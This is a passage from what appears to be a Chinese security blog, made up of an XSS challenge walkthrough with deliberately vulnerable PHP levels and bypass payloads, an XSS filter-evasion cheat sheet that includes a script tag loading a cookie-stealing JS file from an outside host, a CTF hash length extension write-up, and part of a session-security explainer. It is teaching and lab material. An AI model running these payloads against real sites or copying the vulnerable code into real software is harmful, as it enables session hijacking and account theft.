+&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt;
+&lt;?php
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+echo &quot;&lt;input type=text value=&apos;&quot;.$ss.&quot;&apos;&gt;&quot;;
+?&gt;</code></pre><p>这一关增加单引号，闭合前面的尖括号，并且闭合单引号，才能解析。</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&apos;&gt;&lt;script&gt;alert(&apos;a&apos;)&lt;/script&gt;</code></pre><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><p>源码：</p>
+<pre><code>&lt;!DOCTYPE html&gt; 
+&lt;html lang=&quot;zh-CN&quot;&gt;
+&lt;body&gt;
+&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt;
+&lt;?php
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+echo &quot;&lt;textarea&gt;$ss&lt;/textarea&gt;&quot;;
+?&gt;</code></pre><p>这一关需要闭合textarea标签。</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&lt;/textarea&gt;&lt;script&gt;alert(&apos;a&apos;)&lt;/script&gt;</code></pre><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>源码：</p>
+<pre><code>&lt;!DOCTYPE html&gt; 
+&lt;html lang=&quot;zh-CN&quot;&gt;
+&lt;body&gt;
+&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt;
+&lt;?php
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+echo &quot;&lt;xmp&gt;$ss&lt;/xmp&gt;&quot;;
+?&gt;</code></pre><p>这一关需要闭合xmp标签，xmp标签会将标签内的任何代码不做任何处理的显示出来。</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&lt;/xmp&gt;&lt;script&gt;alert(&apos;a&apos;)&lt;/script&gt;</code></pre><h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h1><p>源码：</p>
+<pre><code>&lt;!DOCTYPE html&gt; 
+&lt;html lang=&quot;zh-CN&quot;&gt;
+&lt;body&gt;
+&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt;
+&lt;div&gt;
+&lt;?php
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+$ss=preg_replace(&quot;/&gt;/&quot;,&quot;&amp;gt&quot;,$ss);
+$ss=preg_replace(&quot;/&lt;/&quot;,&quot;&amp;lt&quot;,$ss);
+echo &apos;&lt;input type=&quot;text&quot; value=&quot;&apos;.$ss.&apos;&quot;&gt;&apos;;
+?&gt;</code></pre><p>这一关将尖括号进行了实体化，本打算使用js来进行实体编码，但是写了半天没写出来！php将就用吧。 </p>
+<p>通常情况下实体化基本可以防御所有xss，但是在特定情况下并不需要尖括号，通过autofocus属性去触发onfocus事件</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&quot; autofocus onfocus=&quot;alert(&apos;a&apos;)</code></pre><h1 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h1><p>源码：</p>
+<pre><code>&lt;!DOCTYPE html&gt; 
+&lt;html lang=&quot;zh-CN&quot;&gt;
+&lt;body&gt;
+&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt;
+&lt;div&gt;
+&lt;?php
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+$ss=preg_replace(&apos;/&quot;/&apos;,&quot;&amp;quot&quot;,$ss);
+echo &apos;&lt;iframe src=&quot;&apos;.$ss.&apos;&quot;&gt;&lt;/iframe&gt;&apos;;
+?&gt;</code></pre><p>这一关过滤了双引号，但是在双引号内可以利用javascript伪协议来加载script脚本。</p>
+<pre><code>http://127.0.0.1/xss.php?xss=javascript:alert(1)</code></pre><h1 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h1><p>源码：</p>
+<pre><code>&lt;?php
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+$ss=preg_replace(&apos;/windows/&apos;,&quot;&quot;,$ss);
+$ss=preg_replace(&apos;/document/&apos;,&quot;&quot;,$ss);
+$ss=preg_replace(&apos;/img/&apos;,&quot;&quot;,$ss);
+$ss=preg_replace(&apos;/script/&apos;,&quot;&quot;,$ss);
+$ss=preg_replace(&apos;/&quot;/&apos;,&quot;&amp;quot&quot;,$ss);
+$ss=preg_replace(&apos;/onerror/&apos;,&quot;&quot;,$ss);
+    echo &quot;&lt;textarea&gt;$ss&lt;/textarea&gt;&quot;;
+?&gt;</code></pre><p>这一关过滤了很多标签，双引号也被过滤了，假装该过滤的都过滤了，唯独svg没过滤。那就相当于什么都没过滤了。</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&lt;/textarea&gt;&lt;svg onload=eval(atob(&apos;YWxlcnQoMSk=&apos;))&gt;</code></pre><p>注释：onload 事件会在页面或图像加载完成后立即发生，eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码，atob解码base64。</p>
+<p>闭合前面标签，再用svg标签，atob中的base64编码绕过一切过滤，只要svg没过滤。</p>
+<h1 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h1><p>源码：</p>
+<pre><code>header(&quot;Content-Security-Policy:
+        script-src &apos;self&apos; &apos;unsafe-inline&apos;;
+        frame-src &apos;self&apos;;&quot;);
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+$ss=preg_replace(&apos;/windows/&apos;,&quot;&quot;,$ss);
+$ss=preg_replace(&apos;/document/&apos;,&quot;&quot;,$ss);
+$ss=preg_replace(&apos;/img/&apos;,&quot;&quot;,$ss);
+$ss=preg_replace(&apos;/script/&apos;,&quot;&quot;,$ss);
+$ss=preg_replace(&apos;/&quot;/&apos;,&quot;&amp;quot&quot;,$ss);
+
+    echo &quot;&lt;textarea&gt;$ss&lt;/textarea&gt;&quot;;
+
+?&gt;</code></pre><p>这一关预加载绕过xss，参考文章第下面链接的第十二关，这关加了个csp内容安全策略。  </p>
+<p>CSP指的是内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。</p>
+<p>CSP 以白名单的机制对网站加载或执行的资源起作用。在网页中，这样的策略通过 HTTP 头信息或者 meta 元素定义。CSP虽然提供了强大的安全保护，但是他也造成了如下问题：Eval及相关函数被禁用、内嵌的JavaScript代码将不会执行、只能通过白名单来加载远程脚本。</p>
+<h1 id="0x9"><a href="#0x9" class="headerlink" title="0x9"></a>0x9</h1><p>源码：</p>
+<pre><code>&lt;?php
+
+header(&quot;Content-Security-Policy:
+        script-src &apos;self&apos; &apos;unsafe-inline&apos;;
+        frame-src &apos;self&apos;;&quot;);
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+$ss=preg_replace(&quot;/&apos;/&quot;,&quot;\&apos;&quot;,$ss);
+    echo &quot;&lt;script&gt;console.log(&apos;&quot;.$ss.&quot;&apos;)&lt;/script&gt;&quot;;        
+?&gt;</code></pre><p>这道题斜线被转义了，后面的括号和单引号用注释符（script中//注释）注释掉，前面单引号再加一个反斜线转义，</p>
+<pre><code>http://127.0.0.1/xss.php?xss=1\&apos;);alert(1);//</code></pre><h1 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h1><p>源码：</p>
+<pre><code>&lt;?php
+#&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; img-src https://*; child-src &apos;none&apos;;&quot;&gt;
+header(&quot;Content-Security-Policy:
+        script-src &apos;self&apos; &apos;unsafe-inline&apos;;
+        frame-src &apos;self&apos;;&quot;);
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+$ss=preg_replace(&quot;/script/&quot;,&quot;&quot;,$ss);
+    echo &quot;&lt;textarea&gt;$ss&lt;/textarea&gt;&quot;;
+?&gt;</code></pre><p>这一关闭合标签，script过滤为空，双写绕过。</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&lt;/textarea&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;</code></pre><h1 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h1><p>源码：</p>
+<pre><code>&lt;?php
+
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+
+header(&quot;X-XSS-Protection: 1; mode=block&quot;); 
+$ss=preg_replace(&quot;/script/&quot;,&quot;&quot;,$ss);
+    echo &quot;$ss&quot;;
+?&gt;</code></pre><p>过滤了script可以大小写绕过，但是多了一个header头X-XSS-Protection，这个头有三个值。分别为</p>
+<pre><code>0： 表示关闭浏览器的XSS防护机制
+
+1：删除检测到的恶意代码， 如果响应报文中没有看到X-XSS-Protection 字段，那么浏览器就认为X-XSS-Protection配置为1，这是浏览器的默认设置
+
+1; mode=block：如果检测到恶意代码，在不渲染恶意代码</code></pre><p>script会被拦截，使用双写可以绕过，可能根据不同浏览器，火狐中这个请求头没作用，原文说要换大小写，无可厚非，这里不换大小写也可以。</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&lt;ScrscriptiPt&gt;alert(&apos;a&apos;)&lt;/ScrscriptiPt&gt;</code></pre><h1 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h1><p>源码：</p>
+<pre><code>&lt;!DOCTYPE html&gt; 
+&lt;html lang=&quot;zh-CN&quot;&gt;
+&lt;body&gt;
+&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt;
+&lt;div&gt;
+&lt;?php
+
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+if(strlen($ss)&gt;10)
+{
+    $ss=substr(&quot;$ss&quot;,0,40);
+}
+#$ss=preg_replace(&quot;/script/&quot;,&quot;&quot;,$ss);
+    echo &quot;$ss&quot;;
+?&gt;</code></pre><p>这一关长度被限制，可以尽力使用短的链接,网站可以根据IP转换十进制。 2544985753=127.0.0.1</p>
+<p>http也不用输入，双斜线即可跳转新窗口。空格等被过滤用/替换。</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&lt;svg/onload=window.open(&apos;//2544985753&apos;)&gt;</code></pre><p>或者</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&lt;svg/onload=eval(location.hash.slice(1))&gt;#alert(1)
+//注：#后面不算入长度</code></pre><p>参考原文的第25关短出新高度。</p>
+<h1 id="0x13"><a href="#0x13" class="headerlink" title="0x13"></a>0x13</h1><p>源码：</p>
+<pre><code>&lt;?php
+
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+
+$ss=preg_replace(&quot;/\./&quot;,&quot;&quot;,$ss);
+$ss=preg_replace(&quot;/\&apos;/&quot;,&quot;&quot;,$ss);
+$ss=preg_replace(&quot;/\&quot;/&quot;,&quot;&quot;,$ss);
+    echo &quot;$ss&quot;;
+?&gt;</code></pre><p>过滤了单引号双引号和.。</p>
+<p>按原文可以使用数组形式，.可以采用十进制来表示。引号使用反引号代替。</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&lt;script&gt;window[&apos;open&apos;](&apos;http://2544985753&apos;)&lt;/script&gt;</code></pre><h1 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h1><pre><code>1.使用/替代空格  如：&lt;img/src=&apos;1&apos;/onerror=alert(&quot;xss&quot;);&gt;
+2.大小写绕过，函数不能大小写
+3.如果是正则替换匹配将script img 等置换为空，可采取双写绕过，如：scrscriptipt
+4.eval字符拼接。 &lt;img src=&quot;x&quot; onerror=&quot;a=`aler`;b=`t`;c=&apos;(`xss`);&apos;;eval(a+b+c)&quot;&gt;
+5.top拼接字符    &lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](`xss`);&lt;/script&gt;
+6.
+
+如果script没被禁止，可以写,只有script 标签里的src可以解析js其他的标签不可以。
+
+&lt;script src=&quot;http://xx.xx.xx.xx/xss/myjs/cookie.js&quot;&gt;&lt;/script&gt;
+
+实体化字符绕过，在浏览器中需要url编码 实体化字符，浏览器会自动截断#后面字符。
+
+&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;
+
+Unicode编码绕过
+
+&lt;img src=&quot;x&quot; onerror=&quot;eval(&apos;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u003b&apos;)&quot;&gt;
+
+url编码绕过
+
+&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&apos;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&apos;))&quot;&gt;  #unescape对括号内进行解码
+
+data协议 //xss常用
+
+&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;  #不url编码也可。
+
+&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt; #好用真好用。
+
+Ascii码绕过
+
+&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;
+
+hex绕过
+
+&lt;img src=x onerror=eval(&apos;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&apos;)&gt;
+
+八进制
+
+&lt;img src=x onerror=alert(&apos;\170\163\163&apos;)&gt;
+
+base64绕过
+
+&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&apos;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&apos;))&quot;&gt;
+
+javascript: 协议 XSS
+
+&lt;a href=&quot;javascript:alert(`xss`);&quot;&gt;xss&lt;/a&gt; //需要点击
+&lt;iframe src=javascript:alert(&apos;xss&apos;);&gt;&lt;/iframe&gt; //直接执行js
+
+7.在js中利用反引号替代单引号双引号。如： &lt;img src=1 onerror=alert(`aa`)&gt;
+
+8.过滤括号 &lt;svg/onload=&quot;window.onerror=eval;throw&apos;=alert\x281\x29&apos;;&quot;&gt;
+
+9.html标签中用//可以代替http://
+
+
+10.十进制ip &lt;img src=&quot;x&quot; onerror=document.location=`http://2130706433/`&gt;</code></pre><h1 id="黑魔法"><a href="#黑魔法" class="headerlink" title="黑魔法"></a>黑魔法</h1><h2 id="svg-xss"><a href="#svg-xss" class="headerlink" title="svg xss"></a>svg xss</h2><pre><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt; 可以执行xss攻击，但是&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;却不可以，为什么加&lt;svg&gt;可以执行，</code></pre><p>svg属于外部元素，外部元素来源于MathML和SVG命名空间。而mathml的定义如下。 </p>
+<p><img src="http://47.106.185.69/1/./img/1554876174.jpg" alt></p>
+<p>那么相应的<svg>标签也遵循xml 和svgd的定义，在xml中 &amp;#40;会被解析成（，所以可以执行。</svg></p>
+<p>可以看考下原文，</p>
+<pre><code>https://www.hackersb.cn/hacker/85.html  </code></pre><h2 id="邮件格式XSS"><a href="#邮件格式XSS" class="headerlink" title="邮件格式XSS"></a>邮件格式XSS</h2><p>通常情况下邮件格式也会造成XSS，必须按照有效的电子地址才能填写成功，</p>
+<pre><code>&quot;&lt;svg/onload=alert(1)&gt;&quot;@x.y</code></pre><p>既符合格式也可以造成XSS，</p>
+<h2 id="url的-0A绕过"><a href="#url的-0A绕过" class="headerlink" title="url的%0A绕过"></a>url的%0A绕过</h2><p>在实际情况中，在需要我们输入url的输入框中，对规则进行了检查，如果我们写javascript://是没法执行的，因为在JavaScript伪协议中，我们在双斜线后面使用JS代码，会payload无效，</p>
+<p>也就是 </p>
+<pre><code>&lt;iframe src=&quot;javascript://alert(1)&quot;&gt;</code></pre><p>这个时候可以用换行符绕过。</p>
+<pre><code>&lt;iframe src=&quot;javascript://%250Aalert(1)&quot;&gt;
+
+&lt;iframe src=&quot;javascript://https://domain.com/%250A1?alert(1):0&quot;&gt;</code></pre><h2 id="绕过单双引号分号"><a href="#绕过单双引号分号" class="headerlink" title="绕过单双引号分号"></a>绕过单双引号分号</h2><pre><code>https://xz.aliyun.com/t/4010</code></pre><p>参考：<a href="https://xz.aliyun.com/t/4414" target="_blank" rel="noopener">https://xz.aliyun.com/t/4414</a><br>参考：<a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/85.html</a><br>参考：<a href="https://xz.aliyun.com/t/4067" target="_blank" rel="noopener">https://xz.aliyun.com/t/4067</a><br>参考：<a href="https://xz.aliyun.com/t/4074#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/4074#toc-1</a>  </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/03/04/XSS姿势小集/" data-id="ck0l0oh95000apy2ix7pa1bwj" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web漏洞/">web漏洞</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-哈希长度拓展攻击" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/03/哈希长度拓展攻击/" class="article-date">
+  <time datetime="2019-03-02T16:00:00.000Z" itemprop="datePublished">2019-03-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/03/哈希长度拓展攻击/">哈希长度拓展攻击</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>记录一道CTF题目，哈希长度拓展攻击，原理有点复杂，这里仅记录下用工具进行哈希长度拓展攻击。</p>
+<p>题目地址：<a href="http://ctf5.shiyanbar.com/web/kzhan.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/kzhan.php</a></p>
+<p>首先先安装下工具。</p>
+<h1 id="安装hashpump"><a href="#安装hashpump" class="headerlink" title="安装hashpump"></a>安装hashpump</h1><p>先安装哈希长度拓展攻击的工具，很容易百度到， 使用hashpump哈希长度拓展工具。 </p>
+<p>crypto    hashpump    部署哈希长度扩展攻击的工具</p>
+<p>可以在python中运行也可以直接在kali中安装。</p>
+<p>在linux安装步骤。</p>
+<pre><code>git clone https://github.com/bwall/HashPump
+apt-get install g++ libssl-dev
+cd HashPump
+make
+make install</code></pre><p>安装的时候出了点小问题 记录一下。make命令显示</p>
+<pre><code>command not found，</code></pre><p>没有安装，我用的是windows的kali拓展命令行，多少有些不足，就是没有make这个指令，更新源之后也没解决，最后百度到一条命令。</p>
+<p>sudo apt-get install  gcc automake autoconf libtool make  ，总算安装上make命令了。但是g++没安装好出现了新的问题。</p>
+<pre><code>root@LAPTOP-J51H1TTH:/1/HashPump# make
+g++ -c -Wall main.cpp
+make: g++: Command not found
+make: *** [makefile:11: main.o] Error 127</code></pre><p>直接安装下gcc ，apt-get update gcc</p>
+<p>python中的安装</p>
+<p>pip install hashpumpy</p>
+<h1 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h1><p><img src="https://i.imgur.com/5GqR4Vn.png" alt></p>
+<p>打开题目首先是这个画面，经过扫描，抓包信息收集完毕后发现在cookie参数中有source参数为0，改为1 常规出源码，事先知道是哈希长度拓展攻击，源码也很容易看懂。</p>
+<p><img src="https://i.imgur.com/R8t2kP2.png" alt><br>源码如下</p>
+<pre><code>&lt;?php 
+$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;
+$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!
+
+$username = $_POST[&quot;username&quot;];
+$password = $_POST[&quot;password&quot;];
+
+if (!empty($_COOKIE[&quot;getmein&quot;])) {
+    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) {
+        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {
+            echo &quot;Congratulations! You are a registered user.\n&quot;;
+            die (&quot;The flag is &quot;. $flag);
+        }
+        else {
+            die (&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;);
+        }
+    }
+    else {
+        die (&quot;You are not an admin! LEAVE.&quot;);
+    }
+}
+
+setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));
+
+if (empty($_COOKIE[&quot;source&quot;])) {
+    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));
+}
+else {
+    if ($_COOKIE[&quot;source&quot;] != 0) {
+        echo &quot;&quot;; // This source code is outputted here
+    }
+}</code></pre><p>第一步，在burp参数中加getmein，绕过第一层if。</p>
+<p>第二层username=admin&amp;password=any</p>
+<p>第三层就用到hash长度拓展攻击。</p>
+<p>需要构造，</p>
+<pre><code>if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password)))</code></pre><p>但是$secret的变量不知道，只知道是长度为15的。并且burp抓包可看到且源码中给出。</p>
+<p>知道 md5($secret . urldecode(“admin” . “admin”))=571580b26c65f306376d4f64e53cb5c7</p>
+<p>hash长度拓展攻击前提要求。</p>
+<p>如果这么一个情况，由两个字符串组成一个字符串($str=$a+$b)，第一个字符串($a)我不知道也不可控，只可控第二个字符串($b)，同时知道第一个字符串($a)的MD5值和长度，这时候我将第二个字符串精心构造一下，便可以算出合成的字符串$str的MD5的值。</p>
+<p>简化一下要知道a+b的MD5值，首先要知道a的长度和MD5值，很简单的条件，</p>
+<p>在这个题目中，secret+admin，长度为20，md5值则是$secret+adminadmin（md5($secret . urldecode(“admin” . “admin”))=571580b26c65f306376d4f64e53cb5c7），这里的等效签名为 secret+admin。所以需要加上admin所以才是给出的MD5。</p>
+<pre><code>root@LAPTOP-J51H1TTH:/1/HashPump# hashpump
+Input Signature: 571580b26c65f306376d4f64e53cb5c7
+Input Data: admin
+Input Key Length: 20
+Input Data to Add: a
+bedb98a49c228ff5e1211065cd4ae17f
+admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00a</code></pre><p>Input Data to Add: 随便写。</p>
+<p>题目中需要urldecode，所以将\x变为%</p>
+<p><img src="https://i.imgur.com/kHEH3BG.png" alt></p>
+<p>得到flag。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/03/03/哈希长度拓展攻击/" data-id="ck0l0oh9u001qpy2ieqi3jiv5" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-身份认证劫持" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/02/28/身份认证劫持/" class="article-date">
+  <time datetime="2019-02-27T16:00:00.000Z" itemprop="datePublished">2019-02-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/02/28/身份认证劫持/">session，cookie认证会话安全问题</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>转：先知社区</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在互联网中，对于用户来说不仅仅是单向信息传输，更重要的是信息交互，但是在web中，http协议是无状态的，当一个请求等到了服务器的回应之后，两者连接便中断了，而第二个请求发出后，服务端并不知道你和第一个请求的关系，所以没办法持续保持身份信息，每个http请求对于服务器来说，如果没有身份认证，那么对服务器来说所有人的请求都是一样无区别的。所以在互联网中，在所有需要信息双向交互的地方就需要身份认证，对于不同的身份给予不同的权限，此时就用到会话这个概念。</p>
+<h1 id="为什么需要会话"><a href="#为什么需要会话" class="headerlink" title="为什么需要会话"></a>为什么需要会话</h1><p>首先要理解tcp的三次握手，一般在TCP三次握手就创建了一个会话，在会话中可以传递信息，等TCP关闭连接就关闭会话了。HTTP协议是基于TCP协议的，所以http会话也是在TCP关闭连接后就关闭会话，而在http1.1中，一般一个连接就只能处理一个请求，所以在需要权限身份认证的时候就需要有一种凭证，才能使得每次请求服务器都知道是你，相当于建立了连续的会话，也就是每次的请求都带有自己的身份凭证。</p>
+<p>简单点，会话就是让你在信息交互的时候让对方知道你是谁，并且一直知道你是谁，但是服务器不是人，没有自我辨别的功能，这时候需要一种凭证，也就是session。站在客户端角度，在你每次登录帐号密码之后，会有一串类似于短秘钥之类的东西，他只属于你，证明你的身份。站在服务器端，在php中，在你进行身份认证之后，会在服务器端保存一个以PHPSESSID为名的文件来储存你的身份，账号等各种信息，在用户每次提交带有session的请求时，自动去搜索这个以session命名的文件，查看里面的反序列化信息（也就是你的身份等信息）。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190301153049-efec32cc-3bf3-1.png" alt></p>
+<h1 id="php中的session"><a href="#php中的session" class="headerlink" title="php中的session"></a>php中的session</h1><p>在上面我们提到了php中的session，那么一旦phpsessid泄露，相当于别人也可以使用你的身份，而且一般session在浏览器关闭后也不会注销，仅仅是你已经丢失了你的sessionid，但是服务端并未立刻失效。<br>但是在php中并不是在登录之后才会给PHPSESSID，而是在</p>
+<pre><code>session_start();</code></pre><p>开始之后，http响应头部信息会返回 set-cookie:PHPSESSID=xxxxxxx,浏览器便会自动创建这个cookie，并且关联这个域名。同时，也在服务器端创建一个以Session ID命名的文件，此时你并没有登录，但是已经给了你相应的session，这时候带着账号密码去登录，登录成功后，Session ID才能匹配你的信息，否则不登录，在服务端创建的session文件内容为空，登录成功后，在服务端以你的phpsessid创建关于你信息的文件，当你带着这个phpsessid继续访问的时候，就会从服务端文件里查找关于你的信息，是否是管理员，还是普通用户，这属于后端代码编写不作讨论。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190301153050-f085de4a-3bf3-1.png" alt></p>
